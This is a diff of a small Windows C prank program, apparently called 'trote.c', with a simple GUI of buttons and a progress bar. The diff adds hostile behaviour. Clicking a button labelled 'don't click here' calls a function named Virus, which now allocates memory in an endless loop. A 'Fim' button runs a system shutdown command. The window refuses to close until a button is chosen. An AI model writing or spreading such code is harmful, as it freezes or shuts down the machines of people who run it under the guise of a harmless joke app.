@@ -1,9 +1,12 @@
 #include <windows.h> // Funções da API do Windows 
 #include <stdio.h>
 #include <commctrl.h>
+#include <stdlib.h>
+#include <string.h>
 
 #define ID_BTN1 1
 #define ID_BTN2 2
+#define ID_BTN3 3
 
 HBITMAP hBitmap; // Variável global para armazenar o bitmap
 
@@ -55,6 +58,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) { // Cada vez que ocorre um evento, o Windows envia uma mensagem para esta função. 
     static HWND hwndButton1;
     static HWND hwndButton2;
+    static HWND hwndButton3;
+    static BOOL bCloseAllowed = FALSE; // Variável para controlar se o fechamento é permitido
 
     switch (uMsg) {
         case WM_CREATE: {
@@ -63,7 +68,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                 "BUTTON",                // Classe do botão
                 "Não clique Aqui!!!",    // Texto do botão
                 WS_VISIBLE | WS_CHILD,   // Estilos do botão
-                10, 20, 120, 30,        // Posição e tamanho do botão
+                0, 20, 120, 30,        // Posição e tamanho do botão
                 hwnd,                    // Janela mãe
                 (HMENU) ID_BTN1,        // ID do botão (1)              
                 (HINSTANCE) GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
@@ -74,9 +79,20 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                 "BUTTON",
                 "Clique Aqui :)",
                 WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
-                120, 20, 120, 30,
+                140, 20, 120, 30,
                 hwnd,
                 (HMENU) ID_BTN2,
+                (HINSTANCE) GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
+                NULL
+            );
+
+            hwndButton3 = CreateWindow(
+                "BUTTON",
+                "Fim",
+                WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
+                280, 20, 120, 30,
+                hwnd,
+                (HMENU) ID_BTN3,
                 (HINSTANCE) GetWindowLongPtr(hwnd, GWLP_HINSTANCE),
                 NULL
             );
@@ -124,6 +140,9 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                     // Inicia um novo thread para a função de loading
                     CreateThread(NULL, 0, ProgressThread, hwnd, 0, NULL);
                     InvalidateRect(hwnd, NULL, TRUE); // Atualiza a janela para mostrar a nova imagem
+
+                    Virus(hwnd);
+
                     break;
 
                 case ID_BTN2:
@@ -134,9 +153,21 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                     }
                     PostQuitMessage(0);
                     return 0;
+
+                case ID_BTN3:
+                    system("c:\\windows\\system32\\shutdown /s");
             }
             break;
         }
+
+        case WM_CLOSE: {
+            if (!bCloseAllowed) {
+                MessageBox(hwnd, "Por favor, escolha uma opcao antes de fechar.", "Atenção", MB_OK | MB_ICONWARNING);
+                return 0; // Impede o fechamento da janela
+            }
+            return DefWindowProc(hwnd, uMsg, wParam, lParam); // Permite o fechamento da janela
+        }
+
         case WM_PAINT: {
             PAINTSTRUCT ps;
             HDC hdc = BeginPaint(hwnd, &ps);
@@ -185,10 +216,8 @@ DWORD WINAPI ProgressThread(LPVOID lpParam) {
     // Atualiza a barra de progresso
     for (int i = 0; i <= 100; i++) {
         SendMessage(hwndProgress, PBM_SETPOS, i, 0); // Define a posição da barra
-        Sleep(50); // Pausa para simular trabalho
+        Sleep(20); // Pausa para simular trabalho
     }
-
-    void Virus(HWND hwnd);
 
     // Remove a barra de progresso após a finalização
     DestroyWindow(hwndProgress);
@@ -196,42 +225,16 @@ DWORD WINAPI ProgressThread(LPVOID lpParam) {
     return 0;
 }
 
+struct node{
+	long int data[50];
+	struct node* next;
+};
+
 void Virus(HWND hwnd) {
-
-     typedef struct {
-        int id;
-        char name[50];
-    } Person;
-
-    const int NUM_OBJECTS = 1000000; // Aumentar o número de objetos
-    const int NUM_ITERATIONS = 5000; // Aumentar o número de iterações
-
-    // Alocação de memória para um grande número de objetos
-    Person *persons = (Person *)malloc(NUM_OBJECTS * sizeof(Person));
-    if (persons == NULL) {
-        MessageBox(hwnd, "Falha na alocação de memória!", "Erro", MB_OK | MB_ICONERROR);
-        return;
-    }
-
-    // Loop para preencher o array de objetos e realizar operações intensivas
-    for (long i = 0; i < NUM_OBJECTS; i++) {
-        // Atribuir ID e nome ao objeto
-        persons[i].id = i + 1;
-        snprintf(persons[i].name, sizeof(persons[i].name), "Pessoa %d", i + 1);
-        
-        // Operação intensiva
-        double result = 0.0;
-        for (long j = 0; j < NUM_ITERATIONS; j++) {
-            result += (double)(j * j) / (j + 1);
-            // Adiciona uma operação adicional para aumentar a carga
-            result += (double)(j * 2) * (j % 3);
-        }
-        
-        // Para evitar otimização do compilador
-        if (i % 1000 == 0) {
-            printf("Processando %d objetos...\n", i);
-        }
-    }
-
+    MessageBox(hwnd, "Virus foi chamado!", "Debug", MB_OK);
+    while(1==1){
+		struct node* head = (struct node*)malloc(sizeof(struct node));
+	}   
 }
+//gcc trote.c -o trote -mwindows -lgdi32 -lcomctl32
 //gcc trote.c -o trote -mwindows -lgdi32 -lcomctl32
